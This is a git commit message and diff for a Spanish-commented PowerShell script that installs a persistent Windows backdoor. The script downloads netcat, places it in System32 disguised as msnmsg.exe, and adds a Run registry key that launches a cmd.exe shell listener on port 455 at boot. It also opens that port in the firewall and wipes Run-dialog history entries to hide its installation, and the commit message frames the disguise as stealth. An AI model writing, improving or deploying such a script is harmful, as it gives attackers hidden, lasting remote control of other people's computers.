544f74ecc31ce79945fcfa2449cfffa00cae4702
alariordas <80034759+alariordas@users.noreply.github.com>
2023-09-15 09:44:31 +0200

    1.2 ncinstaller.ps1
    Script 1.2 Updates and Improvements:
    
    Download Path Change:
    
    Changed the download path for the ZIP file to "C:\Windows\Temp\netcat-win32-1.11.zip" and the destination path to "C:\Windows\Temp\netcat-1.11". This ensures that the script works from a more standard temporary location.
    Basic Parsing for Web Request:
    
    Added -UseBasicParsing to the Invoke-WebRequest cmdlet to improve compatibility and reduce potential issues with web downloads.
    File Existence Check:
    
    Implemented a check to verify if the nc.exe file already exists in the System32 folder before moving it, reducing the risk of overwriting important files.
    Stealthy Execution:
    
    Renamed the nc.exe file to msnmsg.exe if it already exists in the System32 folder. This subtle change helps the tool blend in and remain inconspicuous, enhancing its stealth capabilities.
    Registry Entry Cleanup:
    
    Added a section to clean up specific entries in the RunMRU (Run History) in the Windows Registry that contain sensitive information or references to potentially dangerous scripts.
    Improved ZIP Extraction:
    
    The script now extracts the ZIP file to the specified destination path using Expand-Archive, simplifying the extraction process.

--- ncinstaller.ps1
+++ ncinstaller.ps1
@@ -1,35 +1,65 @@
 
-    # Obtiene el nombre de usuario actual
-    $usuarioActual = $env:USERNAME
 
     # COMANDO DE DESCARGA: Descargar y descomprimir el archivo ZIP
-    $zipFilePath = "C:\Users\$usuarioActual\Downloads\netcat-win32-1.11.zip"
-    $destinationPath = "C:\Users\$usuarioActual\Downloads\netcat-1.11"
+    $zipFilePath = "C:\Windows\Temp\netcat-win32-1.11.zip"
+    $destinationPath = "C:\Windows\Temp\netcat-1.11"
 
     # Descargar el archivo ZIP
-    Invoke-WebRequest -Uri "https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip" -OutFile $zipFilePath
+    if (-Not ([string]::IsNullOrEmpty($zipFilePath))) {
+        Invoke-WebRequest -Uri "https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip" -OutFile $zipFilePath -UseBasicParsing
+    }
+
 
     # Descomprimir el archivo ZIP
     Expand-Archive -Path $zipFilePath -DestinationPath $destinationPath
 
     # UNZIP DEL NC.EXE EN SYSTEM32: Mover el archivo nc.exe a la carpeta System32
-    $ncFilePath = "C:\Users\$usuarioActual\Downloads\netcat-1.11\netcat-1.11\nc.exe"
+    $ncFilePath = "C:\Windows\Temp\netcat-1.11\netcat-1.11\nc.exe"
     $system32Path = "C:\Windows\System32"
 
-    # Mover nc.exe a la carpeta System32
-    Move-Item -Path $ncFilePath -Destination $system32Path
+    # Verificar si el archivo nc.exe existe en la carpeta System32
+    if (Test-Path "$system32Path\nc.exe") {
+        # Mover nc.exe a la carpeta System32
+        Move-Item -Path "$system32Path\nc.exe" -Destination $system32Path
+
+        # Renombrar el archivo nc.exe a msnmsg.exe
+        Remove-Item -Path "C:\Windows\System32\msnmsg.exe" -Force
+        Rename-Item -Path "$system32Path\nc.exe" -NewName "msnmsg.exe"
+    }
+
 
     # ARRANQUE AL INICIO DEL SISTEMA
-    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v nc /d "C:\Windows\System32\nc.exe -Ldp 455 -e cmd.exe" /t REG_SZ /f
+    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v nc /d "C:\Windows\System32\msnmsg.exe -Ldp 455 -e cmd.exe" /t REG_SZ /f
 
     # //ACTIVAR PERSIMOS DE FIREWALL
     netsh advfirewall firewall add rule name="Service Firewall" dir=in action=allow protocol=TCP localport=455 enable=yes
 
     # BORRAR EL ZIP Y LA CARPETA
-    $ncPath = "C:\Users\$usuarioActual\Downloads\netcat-1.11"
+    $ncPath = "C:\Windows\Temp\netcat-1.11"
     Remove-Item -Path $ncPath -Recurse -Force
     Remove-Item -Path $zipFilePath -Force
 
-    
-    # Al final del script
-    Read-Host -Prompt "Presiona Enter para salir"
+
+    # Define la ubicación del historial del Ejecutar en el registro
+    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+
+    # Obtiene las entradas del historial del Ejecutar
+    $runMRUEntries = Get-ItemProperty -Path $registryPath
+
+    # Definir las cadenas que deseas buscar y eliminar
+    $stringsToDelete = @(
+        "https://raw.githubusercontent.com/alariordas/PermanentReverseShell-Win10Backdoor/main/ncinstaller.ps1",
+        "Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force",
+        "ms-settings:windowsdefender"
+    )
+
+    # Recorre las entradas y elimina las que contengan las cadenas específicas
+    foreach ($entryName in $runMRUEntries.PSObject.Properties.Name) {
+        $entryValue = $runMRUEntries.$entryName
+        foreach ($stringToDelete in $stringsToDelete) {
+            if ($entryValue -like "*$stringToDelete*") {
+                Remove-ItemProperty -Path $registryPath -Name $entryName
+                Write-Host "Se ha eliminado la entrada que contiene: $stringToDelete"
+            }
+        }
+    }
